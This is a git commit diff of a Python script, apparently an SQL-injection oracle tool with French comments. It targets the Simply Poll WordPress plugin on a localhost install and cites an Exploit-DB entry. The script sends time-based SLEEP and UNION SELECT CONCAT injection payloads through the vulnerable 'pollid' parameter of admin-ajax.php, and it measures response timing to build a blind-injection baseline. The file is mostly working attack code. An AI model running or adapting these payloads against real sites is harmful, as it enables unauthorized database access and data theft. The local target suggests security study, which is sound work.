2ca2628ae2018b2a583e1fc83c7218127231ee22
usernamedjpris <49071112+usernamedjpris@users.noreply.github.com>
2020-02-25 22:14:35 +0100

    class HttpTarget + def post_request + def get_default_average_time testées

--- sqloracl.py
+++ sqloracl.py
@@ -1,77 +1,49 @@
 #coding:utf-8
-import sys, os
-import random
-import time
-import socket
-import urllib.request
 import requests
+import copy
+import time
 
-## params
-url = "http://localhost/injections/wordp/wp-admin/admin-ajax.php" 
+class HttpTarget:
+    """describe a target with an url, a default payload and the vulnerable param"""
+    def __init__(self, url, payload, param):
+        self.url = url
+        self.payload = payload        
+        self.param = param
 
-def oracle(url, injtxt): 
-    payload = {'action': 'spAjaxResults', 'pollid': '2'+ injtxt}
-    r = requests.post(url, data=payload)    
-    print("[POST]", r.url)
-    print(r.text)
+## targets
+#https://www.exploit-db.com/exploits/40971
+simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
+                         {'action': 'spAjaxResults', 'pollid': '2'},
+                         "pollid")
+
+def post_request(target, injtxt): 
+    """send a post request to the target with a supplement to the vulnerable param and return server response"""
+    injected_target = copy.deepcopy(target)
+    injected_target.payload[target.param] = target.payload[target.param] + injtxt
+    r = requests.post(injected_target.url, data=injected_target.payload)    
+    #print("[POST]", r.url)
+    #print(r.text)
+    return r
+
+def get_default_average_time(target, nb=10):
+    """get average time for wrong requests"""
+    som = 0
+    for i in range(nb):        
+        start = time.clock()
+        post_request(target, chr((10000+i)%55295)+chr((20000+i)%55295))
+        end = time.clock()
+        som += (end - start)
+    return som/nb
 
 
 ## tests
-oracle(url, '')
-oracle(url, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)')
-oracle(url, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--')
-oracle(url, ' AND 6034=6034')
+# post_request 
+# ## wrong post
+print(post_request(simply_poll, chr(156)).text)
+# ## injection SQL (sleep 5s)
+print(post_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
+# ## injection SQL (CONCAT)
+print(post_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)
 
-
-
-
-
-
-
-
-
-
-
-#with urllib.request.urlopen('http://python.org/') as response:
-#   html = response.read()  
-# print(html)                 http://localhost/injections/wordp/wp-admin/admin-ajax.php
-
-
-
-
-#req = urllib.request.Request('http://localhost/injections/wordp/wp-admin/admin-ajax.php')
-#try:
-#    with urllib.request.urlopen(req) as response:
- #       the_page = response.read()   
- #       print(the_page)
-#except urllib.error.HTTPError as e:
- #   print(e.code)
-  #  print(e.read())   
-
-#  req = urllib.request.Request('http://localhost/injections/wordp/wp-admin/admin-ajax.php')
-# with urllib.request.urlopen(req) as response:
-#    the_page = response.read()   
-#    print(the_page)
-
-## params
-#address, port = "127.0.0.10", random.randint(1025, 65535)
-#url = "http://%s:%d/?id=1" % (address, port)
-#cmd = "%s %s %s --batch" % (sys.executable, 
-#                           os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "sqlmap.py")), 
-#                           "-u <url>".replace("<url>",url))
-#print(cmd)
-
-
-
-
-
-## connexion au serveur 
-#while True:
- #   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  #  try:
-  #      s.connect((address, port))
-   #     break
-   # except:
-    #    time.sleep(1)    
-     #   print("┗|｀O′|┛ [ECHEC] connexion serveur : nouvelle tentative dans 1s")
-
+# get_default_average_time
+print(get_default_average_time(simply_poll))
